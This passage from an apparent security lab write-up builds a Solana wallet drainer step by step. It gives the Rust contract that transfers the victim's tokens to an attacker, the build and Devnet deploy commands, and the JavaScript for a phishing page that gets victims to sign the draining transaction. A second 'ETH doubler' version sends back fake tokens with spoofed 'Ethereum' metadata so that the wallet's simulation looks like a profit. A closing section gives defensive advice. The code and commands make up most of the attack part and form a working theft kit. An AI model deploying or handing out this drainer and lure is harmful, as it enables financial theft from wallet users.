The heart is `invoke(...)`: my program calls the official SPL Token program with instruction `3` (Transfer) and so moves 1 token from `source` (victim) to `destination` (attacker). The `signer.is_signer` check ensures this only happens if the victim actually signed the transaction, exactly what happens on the phishing page when he clicks the button.

### Toolchain and project structure

I develop on Linux with the Anza Solana toolchain. The install:

```bash
sh -c "$(curl -sSfL https://release.anza.xyz/stable/install)"   # Anza Solana CLI 2.1.19
sudo apt install cargo       # Cargo 1.85
sudo apt install rustup      # Rustup 1.27.1
rustup default stable        # Rustc 1.86
```

The layout is that of an ordinary Rust crate. `Cargo.toml` is the package manifest (like `package.json` in Node) and `src/lib.rs` holds the contract code:

```text
wallet-drainer/
├── Cargo.toml        # manifest: name, version, dependencies (solana-program, spl-token)
├── src/
│   └── lib.rs        # the contract code above
└── target/
    └── deploy/       # the compiled .so file lands here
```

### Building and deploying to Devnet

The program compiles to SBF bytecode (the bytecode the Solana runtime runs), then I point the CLI at Devnet, create a keypair and deploy:

```bash
# compile the program to target/deploy/wallet_drainer.so
cargo build-sbf --manifest-path Cargo.toml --sbf-out-dir target/deploy

# point the CLI at Devnet and make a keypair for the program
solana config set --url devnet
solana-keygen new --outfile ~/devnet-keypair-v2.json

# deploy -> this prints the Program ID the frontend will call
solana program deploy --keypair ~/devnet-keypair-v2.json target/deploy/wallet_drainer.so
```

The **Program ID** is the address my JavaScript uses to talk to the contract. With `solana program show` I confirm it is live on Devnet:

![Terminal showing the deployed program on Devnet](/media/writeups/sc-program-deploy.png)

_The deployed program on Devnet: Program ID `Gy5yvR7n46tDe7UGByZpSwXtkADXbuY55LbMrJ27cRxg`, owned by the BPF Loader, with its authority. From here the frontend can call the contract._

### Giving the victim a token

To demonstrate the theft, the "victim" first needs a token to steal. I create a new SPL token, give the victim a token account for it, mint some into it, and hand over authority:

```bash
spl-token create-token                                          # -> MINT address (call it x)
spl-token create-account x --owner <victim-address> \
  --url devnet --fee-payer ~/devnet-keypair-v2.json             # -> token account (call it y)
spl-token mint x 1000 y --url devnet --fee-payer ~/devnet-keypair-v2.json
spl-token authorize x mint <victim-address> \
  --url devnet --fee-payer ~/devnet-keypair-v2.json
```

### The phishing frontend

The frontend is an ordinary web page with two buttons: "Connect Wallet" and "Activate Protection". The JavaScript loads the Solana libraries straight from a CDN:

```javascript
import { Connection, PublicKey, Transaction, clusterApiUrl }
  from "https://esm.sh/@solana/web3.js@1.73.2";
import { getAssociatedTokenAddress, TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction }
  from "https://esm.sh/@solana/spl-token@0.3.5";
import { Buffer } from "https://esm.sh/buffer@6.0.3";

// The three values that make the attack "mine"
const ATTACKER_PUBKEY = "GKZP4xi557jENMEWoqTi9XWsUiVqU8e6J98vd75mndCs";
const TOKEN_MINT      = "3NCE9Y6JZxEY39UC5GrtxTwZY4dBFWg7HYqzkecBi5XR";
const PROGRAM_ID      = "Gy5yvR7n46tDe7UGByZpSwXtkADXbuY55LbMrJ27cRxg"; // update after each contract change
```

Connecting to Phantom is standard Web3: I ask the wallet for a connection and remember the victim's public key. The actual theft sits in `activateProtection()`, which builds the transaction. Note the four accounts, matching exactly what my Rust contract reads out in the same order:

```javascript
// Connect to the victim's Phantom wallet
async function connectWallet() {
  if (!window.solana) { showStatus("Phantom wallet not detected"); return; }
  provider = window.solana;
  await provider.connect({ onlyIfTrusted: false });
  userPubkey = provider.publicKey;
  activateBtn.disabled = false;
}

// "Activate protection" = build and send the draining transaction
async function activateProtection() {
  const programId = new PublicKey(PROGRAM_ID);

  const tx = new Transaction().add({
    keys: [
      { pubkey: userPubkey,           isSigner: true,  isWritable: true  }, // victim signs
      { pubkey: userTokenAccount,     isSigner: false, isWritable: true  }, // source
      { pubkey: attackerTokenAccount, isSigner: false, isWritable: true  }, // destination
      { pubkey: TOKEN_PROGRAM_ID,     isSigner: false, isWritable: false },
    ],
    programId: programId,
    data: Buffer.from([]) // no instruction data needed
  });

  tx.feePayer = userPubkey;
  const { blockhash } = await connection.getLatestBlockhash("confirmed");
  tx.recentBlockhash = blockhash;

  // The wallet pop-up appears here; if the victim signs, the transfer goes through
  const signedTx = await provider.signTransaction(tx);
  const txId = await connection.sendRawTransaction(signedTx.serialize());
  await connection.confirmTransaction(txId, "confirmed");
  console.log(`Transaction sent: ${txId}`);
}
```

Here is how that looks on the victim's side. A clean, reassuring page that promises to secure his wallet:

![The "Solana Security Guardian" lure page with Connect Wallet and Activate Protection](/media/writeups/sc-guardian-page.png)

_The lure page of the naive version: "Solana Security Guardian, secure your wallet against attacks". Two buttons, reassuring copy, and a "for educational purposes only" footer that is part of my lab setup. The victim connects his wallet and clicks "Activate Protection"._

## 03 · Why this fails: Phantom simulates the transaction

Here the defence does exactly what it should. Phantom runs a **transaction simulation**: it executes the transaction in a sandbox before the user signs, and shows what will happen. For my bare transfer it clearly displayed "−1 Unknown", meaning: you lose 1 token.

![Phantom pop-up showing "−1 Unknown" for the naive version](/media/writeups/sc-naive-phantom.png)

_Phantom simulates the transaction and honestly reports "−1 Unknown" plus the note "Only confirm if you trust this website". So the user sees up front that something is flowing out. No trick survives that._

If the victim signs anyway, the transfer goes through and is traceable on-chain. On Solscan you see the whole chain: the victim interacted with my program, which pushed 1 token to the attacker.

![Solscan detail of the transaction: transfer from victim to attacker via the program](/media/writeups/sc-solscan-transfer.png)

_The transaction on Solscan: status "Success / Finalized". Under "Interact with program `Gy5yvR...27cRxg`" it clearly shows "Transfer from `DKcX5v...` to `GKZP4x...` for 1 `3NCE9Y...`". The theft succeeded, but only because the victim ignored the clear warning._

This is an important insight for the defence: **simulation works**. An honest display of "what does this signature cost me" is the strongest protection a wallet can offer. So my first version is not realistic, and that is good news. The question that logically follows, and that I have to ask as a researcher to understand the attack: can you wrap a transfer so that Phantom's simulation looks innocent, or even attractive?

## 04 · The improved trick: the "ETH doubler"

Version 2's approach is not to bypass the simulation, but to make it read in my favour. The program now does **two transfers in one transaction**:

1. **Transfer 1:** 1 real token from the victim to the attacker (the actual theft).
2. **Transfer 2:** 2 "fake tokens" from the program back to the victim, signed by the program itself via a PDA.

This is the full `src/lib.rs` of the doubler:

```rust
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    program::invoke_signed,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Starting Ethereum doubling service");

    let accounts_iter = &mut accounts.iter();

    let signer_account = next_account_info(accounts_iter)?;
    let user_eth_account = next_account_info(accounts_iter)?;
    let attacker_eth_account = next_account_info(accounts_iter)?;
    let user_fake_eth_account = next_account_info(accounts_iter)?;
    let program_fake_eth_account = next_account_info(accounts_iter)?;
    let vault_authority_account = next_account_info(accounts_iter)?;
    let token_program_account = next_account_info(accounts_iter)?;

    if !signer_account.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    // --- TRANSFER 1: victim sends real ETH to the attacker ---
    msg!("Step 1: User sending real ETH to our account");
    let eth_amount: u64 = 1_000_000_000; // 1 ETH

    let transfer_real_eth_ix = spl_token::instruction::transfer(
        token_program_account.key,
        user_eth_account.key,
        attacker_eth_account.key,
        signer_account.key,
        &[signer_account.key],
        eth_amount,
    )?;
    invoke(
        &transfer_real_eth_ix,
        &[
            user_eth_account.clone(),
            attacker_eth_account.clone(),
            signer_account.clone(),
            token_program_account.clone(),
        ],
    )?;

    // --- TRANSFER 2: the program sends fake ETH back to the victim ---
    msg!("Step 2: Sending fake ETH to user");

    // Derive the PDA that owns the program's fake-ETH vault
    let seed = b"eth_vault";
    let (vault_authority, bump_seed) = Pubkey::find_program_address(&[seed], program_id);
    if vault_authority != *vault_authority_account.key {
        return Err(ProgramError::InvalidArgument);
    }

    let fake_eth_amount: u64 = 2_000_000_000; // 2 fake ETH

    let transfer_fake_eth_ix = spl_token::instruction::transfer(
        token_program_account.key,
        program_fake_eth_account.key,
        user_fake_eth_account.key,
        &vault_authority,
        &[],
        fake_eth_amount,
    )?;

    let bump = [bump_seed];
    let signer_seeds = &[&seed[..], &bump[..]];

    // The program signs for itself, as the vault authority (no private key needed)
    invoke_signed(
        &transfer_fake_eth_ix,
        &[
            program_fake_eth_account.clone(),
            user_fake_eth_account.clone(),
            vault_authority_account.clone(),
            token_program_account.clone(),
        ],
        &[signer_seeds],
    )?;

    msg!("Ethereum doubling completed successfully!");
    Ok(())
}
```

Two concepts do the work here. A **PDA (Program Derived Address)** is an account "owned by the program itself": the program can sign for it without a private key, via `invoke_signed` with the right seeds (`b"eth_vault"` plus a bump). This lets my program pull the fake tokens out of its own vault and give them to the victim. I create the **fake token** as an ordinary SPL token that imitates real Ethereum.

### Making the fake token believable

A token is nameless by default; in the wallet you then only see "Unknown Token". For the trick to work, the fake token has to pose as REAL ETH, with the name "Ethereum", the symbol "ETH" and the familiar logo. For that I attach on-chain metadata to the mint. I pin the logo and a `metadata.json` to IPFS (via Pinata), and with **metaboss** I attach that metadata to the token:

```bash
# mint the imitation token with 9 decimals
ETH_MINT=$(spl-token create-token --decimals 9 | awk '/Address/ {print $2}')

# pin a logo to IPFS, build the metadata, and attach it to the mint
CID_LOGO=$(curl -s -X POST https://api.pinata.cloud/pinning/pinFileToIPFS \
  -H "Authorization: Bearer $PINATA_JWT" -F "file=@eth-logo.png" | jq -r .IpfsHash)
cat > metadata.json <<EOF
{ "name": "Ethereum", "symbol": "ETH",
  "description": "Ethereum token on Solana Devnet (demo)",
  "image": "ipfs://$CID_LOGO" }
EOF
# ... pin metadata.json to IPFS, put the IPFS URL in token-data.json, then:
metaboss create metadata --mint "$ETH_MINT" --metadata token-data.json \
  --keypair ~/devnet-keypair-v2.json --rpc https://api.devnet.solana.com
```

Then I create a token account owned by my program's **PDA** and fund it with the fake ETH. I compute the PDA address with a small script, the same seed as in the contract:

```javascript
const { PublicKey } = require('@solana/web3.js');
const programId = new PublicKey('<YOUR PROGRAM ID>');
const seed = Buffer.from('eth_vault');
const [pda, bump] = PublicKey.findProgramAddressSync([seed], programId);
console.log('Vault authority PDA:', pda.toString());
```

```bash
# token account owned by the PDA, then send the fake ETH to it
spl-token create-account <MINT> --owner <PDA-ADDRESS> --fee-payer ~/devnet-keypair-v2.json
spl-token transfer <MINT> 1000 <PDA-TOKEN-ACCOUNT> --owner ~/attacker.json \
  --fund-recipient --allow-unfunded-recipient
```

After rebuilding and redeploying the contract, and updating the addresses in the HTML, the doubler is ready.

### The bitter punchline

Now the painful part: Phantom simulates this transaction too, and honestly reports "−1 ETH" and "+2 fakeETH". The defence feature, the simulation from version 1, now shows the victim a "profit" himself: two back for one. The attacker no longer has to convince anyone; the wallet seems to deliver the good news itself.

![The doubler's Phantom pop-up: −1 ETH, +2 fakeETH](/media/writeups/sc-phantom-doubler.png)

_The "doubler" Phantom pop-up. The simulation estimates "−1 ETH" and "+2 fakeETH". Phantom warns honestly ("Balance changes are estimated" and "Only confirm if you trust this website"), but that +2 looks like pure profit. That is exactly where the deception wins: not by bypassing the warning, but by making you read it in your own favour._

## 05 · The victim's perspective

From the other side it is sobering how simple it is. The user lands on a page promising to double his ETH, connects his wallet, clicks the button, sees a wallet pop-up saying he gets 2 ETH back, and confirms. One real token gone, two worthless tokens back that look like real ETH in his wallet. Exactly the kind of "too good to be true" promise that still works in memecoin hype, where doubling is not even implausible.

![The EthDouble lure page](/media/writeups/sc-doubler-page.png)

_The lure page: "EthDouble, Double Your ETH". Fake stats (358 users, 1,432 ETH doubled, 2.4 second average return) build trust and urgency. The "for educational purposes only" footer is part of my lab setup._

And the result, on Devnet: the real token moves to the attacker's wallet.

![The attacker's wallet in Testnet Mode with the incoming token](/media/writeups/sc-attacker-wallet-testnet.png)

_The result in the attacker's wallet, with the clear "Testnet Mode" banner: the incoming token shows up as "Unknown Token". On mainnet this would be the victim's real balance._

## 06 · Blue team: how do you defend against this?

- **Rely on transaction simulation, but read it properly.** Phantom's simulation is your strongest weapon. The "doubler" abuses the fact that users do not check token names. Seeing a token you did not buy flowing in? Red flag.
- **Verify tokens, not just names.** A token that calls itself "ETH" is not ETH. Wallets should verify known token names and symbols against a trusted (verified token) list and warn on imitations. As a user: check the mint address, not the picture.
- **Do not sign anything at unknown dApps.** The attack only works because any random website can trigger a wallet pop-up. Connect your wallet only to services you know and trust, and be extra critical when there is urgency or a reward involved.
- **Separate your "trading" wallet from your savings wallet.** Keep only small amounts in the wallet you experiment with. That way a bad signature is a lesson, not a disaster.
- **For wallet developers:** treat token metadata as untrusted. Clearly show the difference between a verified and an unknown/imitated token, and make the net impact of a transaction impossible to hide behind a misleading name.

The core: on the blockchain the code is transparent, but trust is won in the **wallet's UI**. That is where the user decides, so that is where the defence must be sharpest.

**References:** Solana Docs (programs, PDAs, `invoke_signed`). SPL Token Program (Transfer instruction). Metaboss & Pinata (token metadata on IPFS). Phantom (transaction simulation). MITRE ATT&CK: T1657 (Financial Theft), T1534 (Internal Spearphishing, analogous for social engineering). Coinbase (explainer on smart contracts and `approve()` abuse).

</div>
